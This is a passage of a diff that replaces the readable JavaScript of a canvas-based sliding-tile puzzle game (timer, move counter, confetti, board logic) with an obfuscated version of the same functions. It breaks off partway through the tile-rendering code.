@@ -1,854 +1,739 @@
-    // Create animated background particles
-    function createParticles() {
-        const particles = document.getElementById('particles');
-        for (let i = 0; i < 50; i++) {
-            const particle = document.createElement('div');
-            particle.className = 'particle';
-            particle.style.left = Math.random() * 100 + '%';
-            particle.style.animationDelay = Math.random() * 6 + 's';
-            particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
-            particles.appendChild(particle);
+const _0x686675 = _0x5670;
+(function (_0x344ac8, _0x2cc877) {
+    const _0x43a11d = _0x5670, _0x193f72 = _0x344ac8();
+    while (!![]) {
+        try {
+            const _0xdd6e6 = -parseInt(_0x43a11d(0x7a)) / 0x1 + -parseInt(_0x43a11d(0x99)) / 0x2 * (-parseInt(_0x43a11d(0xba)) / 0x3) + -parseInt(_0x43a11d(0xdd)) / 0x4 * (parseInt(_0x43a11d(0xd6)) / 0x5) + parseInt(_0x43a11d(0x94)) / 0x6 * (-parseInt(_0x43a11d(0xd9)) / 0x7) + -parseInt(_0x43a11d(0x7c)) / 0x8 + parseInt(_0x43a11d(0x75)) / 0x9 + -parseInt(_0x43a11d(0x116)) / 0xa * (-parseInt(_0x43a11d(0xa9)) / 0xb);
+            if (_0xdd6e6 === _0x2cc877)
+                break;
+            else
+                _0x193f72['push'](_0x193f72['shift']());
+        } catch (_0x3a0d7a) {
+            _0x193f72['push'](_0x193f72['shift']());
         }
     }
-
-    // Preloader
-    window.addEventListener('load', function () {
-        setTimeout(function () {
-            document.getElementById('preloader').classList.add('hidden');
-            document.getElementById('main-container').style.opacity = '1';
-        }, 1500);
-    });
-
-    // Game variables
-    let moves = 0;
-    let seconds = 0;
-    let timerInterval;
-    let gameStarted = false;
-
-    function updateMoves() {
-        moves++;
-        document.getElementById('moves').textContent = moves;
-
-        // Add pulse animation
-        const movesElement = document.getElementById('moves');
-        movesElement.style.transform = 'scale(1.2)';
-        setTimeout(() => {
-            movesElement.style.transform = 'scale(1)';
-        }, 150);
+}(_0x1f42, 0x50d05));
+function createParticles() {
+    const _0x575d7c = _0x5670, _0x1cc589 = document['getElementById'](_0x575d7c(0x121));
+    for (let _0x2a9a30 = 0x0; _0x2a9a30 < 0x32; _0x2a9a30++) {
+        const _0x10ffa2 = document['createElement'](_0x575d7c(0xf2));
+        _0x10ffa2[_0x575d7c(0x7e)] = _0x575d7c(0xef), _0x10ffa2[_0x575d7c(0xfd)][_0x575d7c(0xda)] = Math['random']() * 0x64 + '%', _0x10ffa2['style'][_0x575d7c(0xe5)] = Math['random']() * 0x6 + 's', _0x10ffa2[_0x575d7c(0xfd)][_0x575d7c(0x70)] = Math[_0x575d7c(0xe0)]() * 0x3 + 0x3 + 's', _0x1cc589[_0x575d7c(0x11f)](_0x10ffa2);
     }
-
-    function startTimer() {
-        if (!gameStarted) {
-            gameStarted = true;
-            clearInterval(timerInterval);
-            seconds = 0;
-            updateTimerDisplay();
-            timerInterval = setInterval(function () {
-                seconds++;
-                updateTimerDisplay();
-            }, 1000);
+}
+window['addEventListener'](_0x686675(0x9e), function () {
+    setTimeout(function () {
+        const _0x78fdd = _0x5670;
+        document[_0x78fdd(0x80)]('preloader')[_0x78fdd(0xf0)]['add']('hidden'), document[_0x78fdd(0x80)](_0x78fdd(0x103))[_0x78fdd(0xfd)]['opacity'] = '1';
+    }, 0x5dc);
+});
+let moves = 0x0, seconds = 0x0, timerInterval, gameStarted = ![];
+function updateMoves() {
+    const _0x170699 = _0x686675;
+    moves++, document[_0x170699(0x80)](_0x170699(0xa6))['textContent'] = moves;
+    const _0x4cd842 = document['getElementById'](_0x170699(0xa6));
+    _0x4cd842[_0x170699(0xfd)][_0x170699(0xa5)] = 'scale(1.2)', setTimeout(() => {
+        const _0x566f81 = _0x170699;
+        _0x4cd842[_0x566f81(0xfd)][_0x566f81(0xa5)] = 'scale(1)';
+    }, 0x96);
+}
+function startTimer() {
+    !gameStarted && (gameStarted = !![], clearInterval(timerInterval), seconds = 0x0, updateTimerDisplay(), timerInterval = setInterval(function () {
+        seconds++, updateTimerDisplay();
+    }, 0x3e8));
+}
+function updateTimerDisplay() {
+    const _0x122cbf = _0x686675, _0x461ea7 = Math['floor'](seconds / 0x3c), _0x3de8bb = seconds % 0x3c;
+    document['getElementById'](_0x122cbf(0xa1))[_0x122cbf(0x119)] = _0x461ea7['toString']()['padStart'](0x2, '0') + ':' + _0x3de8bb[_0x122cbf(0xf7)]()[_0x122cbf(0x117)](0x2, '0');
+}
+function resetGameStats() {
+    const _0x265fef = _0x686675;
+    moves = 0x0, gameStarted = ![], document[_0x265fef(0x80)]('moves')[_0x265fef(0x119)] = moves, clearInterval(timerInterval), seconds = 0x0, updateTimerDisplay();
+}
+function createConfetti() {
+    const _0x17975e = _0x686675, _0x62b255 = document[_0x17975e(0x80)](_0x17975e(0x10e));
+    _0x62b255[_0x17975e(0x76)] = '';
+    const _0x1db311 = [
+        _0x17975e(0xe4),
+        _0x17975e(0xb5),
+        '#45b7d1',
+        _0x17975e(0x92),
+        '#f0932b',
+        _0x17975e(0x107),
+        '#6c5ce7',
+        _0x17975e(0xb6)
+    ];
+    for (let _0x47fa5e = 0x0; _0x47fa5e < 0x96; _0x47fa5e++) {
+        const _0x362ed4 = document[_0x17975e(0x10b)](_0x17975e(0xf2));
+        _0x362ed4[_0x17975e(0x7e)] = _0x17975e(0xcc);
+        const _0x235601 = _0x1db311[Math['floor'](Math[_0x17975e(0xe0)]() * _0x1db311[_0x17975e(0xce)])];
+        _0x362ed4['style'][_0x17975e(0x78)] = _0x235601, _0x362ed4[_0x17975e(0xfd)][_0x17975e(0xda)] = Math[_0x17975e(0xe0)]() * 0x64 + 'vw', _0x362ed4[_0x17975e(0xfd)][_0x17975e(0xe5)] = Math[_0x17975e(0xe0)]() * 0x3 + 's', _0x362ed4[_0x17975e(0xfd)][_0x17975e(0x70)] = Math[_0x17975e(0xe0)]() * 0x3 + 0x2 + 's';
+        const _0x3198d1 = Math[_0x17975e(0xe0)]() * 0x8 + 0x4;
+        _0x362ed4[_0x17975e(0xfd)]['width'] = _0x3198d1 + 'px', _0x362ed4['style'][_0x17975e(0x8d)] = _0x3198d1 + 'px', _0x362ed4['style'][_0x17975e(0xc3)] = _0x17975e(0xac) + _0x362ed4['style']['animationDuration'] + _0x17975e(0x97), _0x62b255['appendChild'](_0x362ed4), setTimeout(() => {
+            const _0x3c1f26 = _0x17975e;
+            _0x362ed4[_0x3c1f26(0xfd)][_0x3c1f26(0x114)] = '1';
+        }, 0xa);
+    }
+    setTimeout(() => {
+        _0x62b255['innerHTML'] = '';
+    }, 0x1770);
+}
+const style = document[_0x686675(0x10b)](_0x686675(0xfd));
+style[_0x686675(0x76)] = _0x686675(0xc4), document[_0x686675(0xc8)][_0x686675(0x11f)](style);
+function showWinModal(_0x2f1251, _0x48b5bb) {
+    const _0x19984a = _0x686675, _0x1e05d9 = document['getElementById'](_0x19984a(0x96)), _0x47c2de = document[_0x19984a(0x80)](_0x19984a(0xab));
+    _0x47c2de[_0x19984a(0x76)] = _0x19984a(0xc6) + _0x2f1251 + '</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>🎯\x20Moves:\x20' + _0x48b5bb + _0x19984a(0xd8), _0x1e05d9[_0x19984a(0xf0)][_0x19984a(0xdf)](_0x19984a(0xd5));
+}
+function closeWinModal() {
+    const _0x37e5f4 = _0x686675;
+    document[_0x37e5f4(0x80)](_0x37e5f4(0x96))[_0x37e5f4(0xf0)][_0x37e5f4(0x87)](_0x37e5f4(0xd5));
+}
+var Factory = function (_0x21219b, _0x5ba094) {
+        const _0x362a8b = _0x686675;
+        for (var _0x275c2d in _0x5ba094) {
+            _0x5ba094[_0x275c2d] = { 'value': _0x5ba094[_0x275c2d] };
         }
-    }
-
-    function updateTimerDisplay() {
-        const minutes = Math.floor(seconds / 60);
-        const remainingSeconds = seconds % 60;
-        document.getElementById('time').textContent =
-            `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
-    }
-
-    function resetGameStats() {
-        moves = 0;
-        gameStarted = false;
-        document.getElementById('moves').textContent = moves;
-        clearInterval(timerInterval);
-        seconds = 0;
-        updateTimerDisplay();
-    }
-
-    // Enhanced confetti
-    function createConfetti() {
-        const container = document.getElementById('confetti-container');
-        container.innerHTML = '';
-
-        const colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#f9ca24', '#f0932b', '#eb4d4b', '#6c5ce7', '#a29bfe'];
-
-        for (let i = 0; i < 150; i++) {
-            const confetti = document.createElement('div');
-            confetti.className = 'confetti';
-
-            const color = colors[Math.floor(Math.random() * colors.length)];
-            confetti.style.backgroundColor = color;
-            confetti.style.left = Math.random() * 100 + 'vw';
-            confetti.style.animationDelay = Math.random() * 3 + 's';
-            confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
-
-            const size = Math.random() * 8 + 4;
-            confetti.style.width = size + 'px';
-            confetti.style.height = size + 'px';
-
-            confetti.style.animation = `confetti-fall ${confetti.style.animationDuration} linear forwards`;
-
-            container.appendChild(confetti);
-
-            setTimeout(() => {
-                confetti.style.opacity = '1';
-            }, 10);
-        }
-
-        setTimeout(() => {
-            container.innerHTML = '';
-        }, 6000);
-    }
-
-    // Add confetti animation
-    const style = document.createElement('style');
-    style.innerHTML = `
-        @keyframes confetti-fall {
-            0% {
-                transform: translateY(-100vh) rotate(0deg);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(100vh) rotate(720deg);
-                opacity: 0;
-            }
-        }
-    `;
-    document.head.appendChild(style);
-
-    // Win modal functions
-    function showWinModal(timeText, movesCount) {
-        const modal = document.getElementById('win-modal');
-        const stats = document.getElementById('win-stats');
-        stats.innerHTML = `
-            <div>⏱️ Time: ${timeText}</div>
-            <div>🎯 Moves: ${movesCount}</div>
-        `;
-        modal.classList.add('show');
-    }
-
-    function closeWinModal() {
-        document.getElementById('win-modal').classList.remove('show');
-    }
-
-    // Game engine code
-    var Factory = function (prototypeObject, methods) {
-        for (var name in methods) {
-            methods[name] = { value: methods[name] };
-        }
-        return Object.create(prototypeObject, methods);
-    };
-
-    var Board = (function () {
-        this.squares = [];
-        this.height = 0;
-        this.width = 0;
-        return function (methods) { return Factory(Board.prototype, methods) };
-    })();
-
-    Board.prototype = {
-        forEachNeighbor: (function () {
-            var neighborOffsets = [[0, -1], [1, 0], [0, 1], [-1, 0]],
-                diagonalNeighborOffsets = [[1, -1], [1, 1], [-1, 1], [-1, -1]];
-            return function (left, top, func, conditions) {
-                conditions = conditions || {};
-                conditions.visitDiagonals = conditions.visitDiagonals === 'undefined' ? true : conditions.visitDiagonals;
-
-                var testEachNeighbor = function (offset, index, array) {
-                    if (this.inbounds(left + offset[0], top + offset[1])) {
-                        func.call(this, left + offset[0], top + offset[1]);
-                    }
-                };
-
-                neighborOffsets.forEach(testEachNeighbor, this);
-                if (conditions.visitDiagonals) {
-                    diagonalNeighborOffsets.forEach(testEachNeighbor, this);
-                }
-            }
-        })(),
-        get: function (left, top) {
-            if (this.inbounds(left, top)) {
-                return this.squares[left + top * this.width];
-            } else {
-                throw new Error('Cannot return a value at position (' + left + ', ' + top + ') because it is out of bounds');
-            }
-        },
-        getNeighbors: function (left, top, conditions) {
-            var neighbors = [];
-            this.forEachNeighbor(left, top, function (l, t) {
-                neighbors.push({ left: l, top: t });
-            }, conditions);
-            return neighbors;
-        },
-        inbounds: function (left, top) {
-            return top >= 0 && left < this.width && top < this.height && left >= 0;
-        },
-        set: function (left, top, value) {
-            if (this.inbounds(left, top)) {
-                this.squares[left + top * this.width] = value;
-            }
-        },
-        swap: function (left, top, left2, top2) {
-            var temp = this.get(left, top);
-            this.set(left, top, this.get(left2, top2));
-            this.set(left2, top2, temp);
-        },
-        isTerminal: function () {
-            return this.squares.join() == this.getWinState().join();
-        },
-        randomize: function () {
-            var blank = {}, blankIndex = this.squares.indexOf(0),
-                last = { left: -1, top: -1 }, neighbors, randomNeighbor,
-                shuffles = 10 * this.height * this.width;
-
-            if (blankIndex != -1) {
-                blank.top = Math.floor(blankIndex / this.width);
-                blank.left = blankIndex - blank.top * this.width;
-
-                for (var i = 0; i < shuffles; i++) {
-                    neighbors = this.getNeighbors(blank.left, blank.top, { visitDiagonals: false }).filter(function (neighbor) {
-                        return !(neighbor.left === last.left && neighbor.top === last.top);
-                    });
-
-                    if (neighbors.length > 0) {
-                        randomNeighbor = neighbors[Math.floor(Math.random() * neighbors.length)];
-                        this.swap(blank.left, blank.top, randomNeighbor.left, randomNeighbor.top);
-                        last = blank;
-                        blank = randomNeighbor;
-                    }
-                }
-            } else {
-                throw Error('Cannot randomize: no empty square');
-            }
-        },
-        reset: function (width, height) {
-            this.height = height;
-            this.width = width;
-            this.squares = this.getWinState().slice(0);
-        },
-        getWinState: (function () {
-            var lastBoardSize, cache;
-            return function () {
-                if (typeof (lastBoardSize) == 'undefined' || this.width * this.height !== lastBoardSize) {
-                    lastBoardSize = this.width * this.height;
-                    return cache = new Array(lastBoardSize + 1).join('0').split('').map(function (e, i, a) {
-                        return i < a.length - 1 ? i + 1 : 0
-                    });
-                } else {
-                    return cache;
-                }
+        return Object[_0x362a8b(0x8b)](_0x21219b, _0x5ba094);
+    }, Board = (function () {
+        return this['squares'] = [], this['height'] = 0x0, this['width'] = 0x0, function (_0x290ccc) {
+            return Factory(Board['prototype'], _0x290ccc);
+        };
+    }());
+Board[_0x686675(0x91)] = {
+    'forEachNeighbor': (function () {
+        var _0x1b7274 = [
+                [
+                    0x0,
+                    -0x1
+                ],
+                [
+                    0x1,
+                    0x0
+                ],
+                [
+                    0x0,
+                    0x1
+                ],
+                [
+                    -0x1,
+                    0x0
+                ]
+            ], _0x4e54d2 = [
+                [
+                    0x1,
+                    -0x1
+                ],
+                [
+                    0x1,
+                    0x1
+                ],
+                [
+                    -0x1,
+                    0x1
+                ],
+                [
+                    -0x1,
+                    -0x1
+                ]
+            ];
+        return function (_0x1c1b0e, _0x3a5491, _0x272ffb, _0x1da4ed) {
+            const _0x5b1354 = _0x5670;
+            _0x1da4ed = _0x1da4ed || {}, _0x1da4ed[_0x5b1354(0xeb)] = _0x1da4ed['visitDiagonals'] === _0x5b1354(0xea) ? !![] : _0x1da4ed[_0x5b1354(0xeb)];
+            var _0x258813 = function (_0x2e9656, _0x27946c, _0x55b07d) {
+                const _0x530eff = _0x5b1354;
+                this[_0x530eff(0xc0)](_0x1c1b0e + _0x2e9656[0x0], _0x3a5491 + _0x2e9656[0x1]) && _0x272ffb['call'](this, _0x1c1b0e + _0x2e9656[0x0], _0x3a5491 + _0x2e9656[0x1]);
             };
-        })()
-    };
-
-    var Game = function (methods) {
-        return Factory(Object, methods);
-    };
-
-    var GameHTML5View = (function () {
-        var canvas, ctx, game, squareSize;
-        return function (methods) { return Factory(GameHTML5View.prototype, methods) };
-    })();
-
-    GameHTML5View.prototype = {
-        attachHTML5Events: function (events) {
-            for (var type in events) {
-                for (var domId in events[type]) {
-                    this.onHTML5Event(domId, type, events[type][domId]);
-                }
+            _0x1b7274[_0x5b1354(0x110)](_0x258813, this), _0x1da4ed[_0x5b1354(0xeb)] && _0x4e54d2[_0x5b1354(0x110)](_0x258813, this);
+        };
+    }()),
+    'get': function (_0x366481, _0x16c054) {
+        const _0x5ca3d5 = _0x686675;
+        if (this[_0x5ca3d5(0xc0)](_0x366481, _0x16c054))
+            return this[_0x5ca3d5(0x9a)][_0x366481 + _0x16c054 * this[_0x5ca3d5(0xd7)]];
+        else
+            throw new Error(_0x5ca3d5(0xdb) + _0x366481 + ',\x20' + _0x16c054 + _0x5ca3d5(0x8e));
+    },
+    'getNeighbors': function (_0x4c784c, _0x573772, _0x48c20c) {
+        const _0xe60183 = _0x686675;
+        var _0x3e2adb = [];
+        return this[_0xe60183(0xf1)](_0x4c784c, _0x573772, function (_0x22c07b, _0x5d4b4f) {
+            const _0xe3877a = _0xe60183;
+            _0x3e2adb[_0xe3877a(0xff)]({
+                'left': _0x22c07b,
+                'top': _0x5d4b4f
+            });
+        }, _0x48c20c), _0x3e2adb;
+    },
+    'inbounds': function (_0x3833bf, _0xb9ee8a) {
+        const _0x41a83a = _0x686675;
+        return _0xb9ee8a >= 0x0 && _0x3833bf < this[_0x41a83a(0xd7)] && _0xb9ee8a < this[_0x41a83a(0x8d)] && _0x3833bf >= 0x0;
+    },
+    'set': function (_0x36e4f0, _0x585a4c, _0x3b7d73) {
+        const _0x4b5f97 = _0x686675;
+        this[_0x4b5f97(0xc0)](_0x36e4f0, _0x585a4c) && (this[_0x4b5f97(0x9a)][_0x36e4f0 + _0x585a4c * this['width']] = _0x3b7d73);
+    },
+    'swap': function (_0x49c421, _0x3bc483, _0x50a503, _0x5e2797) {
+        const _0x247693 = _0x686675;
+        var _0x5683e4 = this[_0x247693(0xa8)](_0x49c421, _0x3bc483);
+        this[_0x247693(0x81)](_0x49c421, _0x3bc483, this[_0x247693(0xa8)](_0x50a503, _0x5e2797)), this[_0x247693(0x81)](_0x50a503, _0x5e2797, _0x5683e4);
+    },
+    'isTerminal': function () {
+        const _0x21fa5b = _0x686675;
+        return this[_0x21fa5b(0x9a)][_0x21fa5b(0xe6)]() == this[_0x21fa5b(0x10d)]()[_0x21fa5b(0xe6)]();
+    },
+    'randomize': function () {
+        const _0x9bc33 = _0x686675;
+        var _0x190225 = {}, _0x4f93ae = this[_0x9bc33(0x9a)][_0x9bc33(0xe2)](0x0), _0x57aeba = {
+                'left': -0x1,
+                'top': -0x1
+            }, _0x42528b, _0xb37b25, _0x55f248 = 0xa * this[_0x9bc33(0x8d)] * this[_0x9bc33(0xd7)];
+        if (_0x4f93ae != -0x1) {
+            _0x190225[_0x9bc33(0x98)] = Math['floor'](_0x4f93ae / this[_0x9bc33(0xd7)]), _0x190225[_0x9bc33(0xda)] = _0x4f93ae - _0x190225['top'] * this[_0x9bc33(0xd7)];
+            for (var _0x48f379 = 0x0; _0x48f379 < _0x55f248; _0x48f379++) {
+                _0x42528b = this['getNeighbors'](_0x190225[_0x9bc33(0xda)], _0x190225[_0x9bc33(0x98)], { 'visitDiagonals': ![] })['filter'](function (_0x2dc011) {
+                    const _0x4fcae7 = _0x9bc33;
+                    return !(_0x2dc011[_0x4fcae7(0xda)] === _0x57aeba[_0x4fcae7(0xda)] && _0x2dc011[_0x4fcae7(0x98)] === _0x57aeba['top']);
+                }), _0x42528b[_0x9bc33(0xce)] > 0x0 && (_0xb37b25 = _0x42528b[Math['floor'](Math[_0x9bc33(0xe0)]() * _0x42528b['length'])], this[_0x9bc33(0xd1)](_0x190225['left'], _0x190225[_0x9bc33(0x98)], _0xb37b25['left'], _0xb37b25[_0x9bc33(0x98)]), _0x57aeba = _0x190225, _0x190225 = _0xb37b25);
             }
-        },
-        getCoordinates: function (event) {
-            var x, y;
-            if (event.offsetX || event.offsetY) {
-                x = event.offsetX;
-                y = event.offsetY;
-            } else {
-                if (event.x || event.y) {
-                    x = event.x;
-                    y = event.y;
-                } else {
-                    x = event.clientX + document.body.scrollLeft + document.documentElement.scrollLeft;
-                    y = event.clientY + document.body.scrollTop + document.documentElement.scrollTop;
-                }
-                x -= this.canvas.offsetLeft;
-                y -= this.canvas.offsetTop;
-            }
-            return { left: x, top: y };
-        },
-        onHTML5Event: function (id, type, func) {
-            document.getElementById(id).addEventListener(type, func);
-        },
-        calculateSquareSize: function () {
-            var height = this.canvas.height - 1, width = this.canvas.width - 1;
-            this.squareSize = Math.min(Math.floor(width / this.game.board.width), Math.floor(height / this.game.board.height));
-        },
-        init: function (game, canvasId, events) {
-            this.canvas = document.getElementById(canvasId);
-            this.ctx = this.canvas.getContext('2d');
-            this.game = game;
-            this.attachHTML5Events(events);
-        },
-        render: function () {
-            var board = this.game.board;
-            this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
-            for (var top = 0; top < board.height; top++) {
-                for (var left = 0; left < board.width; left++) {
-                    this.renderSquare(left, top);
-                }
-            }
-        },
-        renderSquare: function (left, top) {
-            var board = this.game.board,
-                ctx = this.ctx,
-                ss = this.squareSize,
-                fontSize = Math.floor(ss / 2.2),
-                value = board.get(left, top);
-
-            if (value === 0) {
-                // Draw subtle empty space background
-                const x = left * (ss + 1);
-                const y = top * (ss + 1);
-
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.05)';
-                ctx.beginPath();
-                ctx.roundRect(x + 2, y + 2, ss - 4, ss - 4, 6);
-                ctx.fill();
-
-                // Inner shadow for empty space
-                ctx.shadowColor = 'rgba(0, 0, 0, 0.2)';
-                ctx.shadowBlur = 8;
-                ctx.shadowOffsetX = 0;
-                ctx.shadowOffsetY = 0;
-                ctx.shadowInset = true;
-
-                ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
-                ctx.lineWidth = 1;
-                ctx.beginPath();
-                ctx.roundRect(x + 2, y + 2, ss - 4, ss - 4, 6);
-                ctx.stroke();
-
-                // Reset shadow
-                ctx.shadowColor = 'transparent';
-                ctx.shadowBlur = 0;
-            } else {
-                const x = left * (ss + 1);
-                const y = top * (ss + 1);
-                const depth = 6; // 3D depth
-
-                // Save context for transformations
-                ctx.save();
-
-                // 1. Draw bottom shadow (furthest back)
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.3)';
-                ctx.beginPath();
-                ctx.roundRect(x + depth + 1, y + depth + 1, ss - 2, ss - 2, 8);
-                ctx.fill();
-
-                // 2. Draw 3D side faces
-                // Right side face
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.15)';
-                ctx.beginPath();
-                ctx.moveTo(x + ss, y);
-                ctx.lineTo(x + ss + depth, y + depth);
-                ctx.lineTo(x + ss + depth, y + ss + depth);
-                ctx.lineTo(x + ss, y + ss);
-                ctx.closePath();
-                ctx.fill();
-
-                // Bottom side face
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.2)';
-                ctx.beginPath();
-                ctx.moveTo(x, y + ss);
-                ctx.lineTo(x + depth, y + ss + depth);
-                ctx.lineTo(x + ss + depth, y + ss + depth);
-                ctx.lineTo(x + ss, y + ss);
-                ctx.closePath();
-                ctx.fill();
-
-                // 3. Create main face gradient (top surface)
-                const mainGradient = ctx.createLinearGradient(x, y, x, y + ss);
-
-                // Color based on number value for variety
-                const colors = [
-                    ['#ff6b6b', '#ee5a24'], // Red
-                    ['#4ecdc4', '#00d2d3'], // Teal  
-                    ['#45b7d1', '#3742fa'], // Blue
-                    ['#f9ca24', '#f0932b'], // Orange
-                    ['#6c5ce7', '#a29bfe'], // Purple
-                    ['#00b894', '#00cec9'], // Green
-                    ['#fd79a8', '#e84393'], // Pink
-                    ['#fdcb6e', '#e17055'], // Yellow
-                    ['#74b9ff', '#0984e3']  // Light Blue
-                ];
-
-                const colorPair = colors[(value - 1) % colors.length];
-                mainGradient.addColorStop(0, colorPair[0]);
-                mainGradient.addColorStop(1, colorPair[1]);
-
-                // 4. Draw main face
-                ctx.fillStyle = mainGradient;
-                ctx.beginPath();
-                ctx.roundRect(x, y, ss, ss, 8);
-                ctx.fill();
-
-                // 5. Add top highlight (bevel effect)
-                const highlightGradient = ctx.createLinearGradient(x, y, x, y + ss / 3);
-                highlightGradient.addColorStop(0, 'rgba(255, 255, 255, 0.6)');
-                highlightGradient.addColorStop(1, 'rgba(255, 255, 255, 0)');
-
-                ctx.fillStyle = highlightGradient;
-                ctx.beginPath();
-                ctx.roundRect(x + 2, y + 2, ss - 4, ss / 2, 6);
-                ctx.fill();
-
-                // 6. Add inner shadow for depth
-                const shadowGradient = ctx.createLinearGradient(x, y + ss * 0.7, x, y + ss);
-                shadowGradient.addColorStop(0, 'rgba(0, 0, 0, 0)');
-                shadowGradient.addColorStop(1, 'rgba(0, 0, 0, 0.2)');
-
-                ctx.fillStyle = shadowGradient;
-                ctx.beginPath();
-                ctx.roundRect(x + 2, y + ss * 0.7, ss - 4, ss * 0.3 - 2, 6);
-                ctx.fill();
-
-                // 7. Add border/edge highlight
-                ctx.strokeStyle = 'rgba(255, 255, 255, 0.3)';
-                ctx.lineWidth = 1;
-                ctx.beginPath();
-                ctx.roundRect(x + 0.5, y + 0.5, ss - 1, ss - 1, 8);
-                ctx.stroke();
-
-                // 8. Draw number with 3D text effect
-                ctx.font = `bold ${fontSize}px Poppins`;
-                ctx.textAlign = 'center';
-                ctx.textBaseline = 'middle';
-
-                // Text depth/shadow layers
-                for (let i = depth; i > 0; i--) {
-                    ctx.fillStyle = `rgba(0, 0, 0, ${0.1 * (depth - i + 1)})`;
-                    ctx.fillText(value, x + ss / 2 + i / 2, y + ss / 2 + i / 2);
-                }
-
-                // Main text with gradient
-                const textGradient = ctx.createLinearGradient(x, y, x, y + ss);
-                textGradient.addColorStop(0, '#ffffff');
-                textGradient.addColorStop(1, '#f0f0f0');
-
-                ctx.fillStyle = textGradient;
-                ctx.fillText(value, x + ss / 2, y + ss / 2);
-
-                // Text highlight
-                ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
-                ctx.fillText(value, x + ss / 2, y + ss / 2 - 1);
-
-                // Restore context
-                ctx.restore();
+        } else
+            throw Error(_0x9bc33(0xc1));
+    },
+    'reset': function (_0xff748d, _0x5be357) {
+        const _0x32d233 = _0x686675;
+        this[_0x32d233(0x8d)] = _0x5be357, this[_0x32d233(0xd7)] = _0xff748d, this['squares'] = this[_0x32d233(0x10d)]()[_0x32d233(0x122)](0x0);
+    },
+    'getWinState': (function () {
+        var _0x4a7412, _0x5220a5;
+        return function () {
+            const _0x2904c4 = _0x5670;
+            return typeof _0x4a7412 == _0x2904c4(0xea) || this[_0x2904c4(0xd7)] * this[_0x2904c4(0x8d)] !== _0x4a7412 ? (_0x4a7412 = this[_0x2904c4(0xd7)] * this['height'], _0x5220a5 = new Array(_0x4a7412 + 0x1)[_0x2904c4(0xe6)]('0')[_0x2904c4(0x115)]('')['map'](function (_0x56ff95, _0x1e6c48, _0x3a5616) {
+                const _0x200c79 = _0x2904c4;
+                return _0x1e6c48 < _0x3a5616[_0x200c79(0xce)] - 0x1 ? _0x1e6c48 + 0x1 : 0x0;
+            })) : _0x5220a5;
+        };
+    }())
+};
+var Game = function (_0x3a9fa2) {
+        return Factory(Object, _0x3a9fa2);
+    }, GameHTML5View = (function () {
+        var _0x28f35b, _0x300cf0, _0x244d2e, _0x5f4b3f;
+        return function (_0x500e17) {
+            const _0x240c97 = _0x5670;
+            return Factory(GameHTML5View[_0x240c97(0x91)], _0x500e17);
+        };
+    }());
+GameHTML5View[_0x686675(0x91)] = {
+    'attachHTML5Events': function (_0xe947a4) {
+        const _0x2060f9 = _0x686675;
+        for (var _0x158ca9 in _0xe947a4) {
+            for (var _0x241b36 in _0xe947a4[_0x158ca9]) {
+                this[_0x2060f9(0xbb)](_0x241b36, _0x158ca9, _0xe947a4[_0x158ca9][_0x241b36]);
             }
         }
+    },
+    'getCoordinates': function (_0x181ed2) {
+        const _0x275144 = _0x686675;
+        var _0x432f0e, _0xdd55f5;
+        return _0x181ed2[_0x275144(0x10a)] || _0x181ed2['offsetY'] ? (_0x432f0e = _0x181ed2[_0x275144(0x10a)], _0xdd55f5 = _0x181ed2[_0x275144(0xa7)]) : (_0x181ed2['x'] || _0x181ed2['y'] ? (_0x432f0e = _0x181ed2['x'], _0xdd55f5 = _0x181ed2['y']) : (_0x432f0e = _0x181ed2['clientX'] + document['body'][_0x275144(0xdc)] + document[_0x275144(0x10f)][_0x275144(0xdc)], _0xdd55f5 = _0x181ed2[_0x275144(0x77)] + document['body']['scrollTop'] + document['documentElement'][_0x275144(0xfe)]), _0x432f0e -= this[_0x275144(0xaa)]['offsetLeft'], _0xdd55f5 -= this['canvas'][_0x275144(0xb0)]), {
+            'left': _0x432f0e,
+            'top': _0xdd55f5
+        };
+    },
+    'onHTML5Event': function (_0x1c866d, _0x519b8f, _0x17c777) {
+        const _0x2cb004 = _0x686675;
+        document[_0x2cb004(0x80)](_0x1c866d)[_0x2cb004(0x6f)](_0x519b8f, _0x17c777);
+    },
+    'calculateSquareSize': function () {
+        const _0x1d0b91 = _0x686675;
+        var _0x46d9f4 = this[_0x1d0b91(0xaa)][_0x1d0b91(0x8d)] - 0x1, _0x178cb1 = this[_0x1d0b91(0xaa)]['width'] - 0x1;
+        this['squareSize'] = Math[_0x1d0b91(0xe3)](Math[_0x1d0b91(0xe9)](_0x178cb1 / this[_0x1d0b91(0x109)][_0x1d0b91(0xc9)][_0x1d0b91(0xd7)]), Math['floor'](_0x46d9f4 / this['game'][_0x1d0b91(0xc9)][_0x1d0b91(0x8d)]));
+    },
+    'init': function (_0x267f31, _0x49cd1a, _0x3e31f9) {
+        const _0x293d18 = _0x686675;
+        this['canvas'] = document[_0x293d18(0x80)](_0x49cd1a), this[_0x293d18(0x120)] = this[_0x293d18(0xaa)][_0x293d18(0x8f)]('2d'), this[_0x293d18(0x109)] = _0x267f31, this[_0x293d18(0x104)](_0x3e31f9);
+    },
+    'render': function () {
+        const _0x368b25 = _0x686675;
+        var _0x2a8bbf = this[_0x368b25(0x109)][_0x368b25(0xc9)];
+        this[_0x368b25(0x120)][_0x368b25(0x7b)](0x0, 0x0, this[_0x368b25(0xaa)]['width'], this[_0x368b25(0xaa)][_0x368b25(0x8d)]);
+        for (var _0x5b8256 = 0x0; _0x5b8256 < _0x2a8bbf[_0x368b25(0x8d)]; _0x5b8256++) {
+            for (var _0x25a1f9 = 0x0; _0x25a1f9 < _0x2a8bbf[_0x368b25(0xd7)]; _0x25a1f9++) {
+                this['renderSquare'](_0x25a1f9, _0x5b8256);
+            }
+        }
+    },
+    'renderSquare': function (_0x30a9cb, _0x353845) {
+        const _0xde518 = _0x686675;
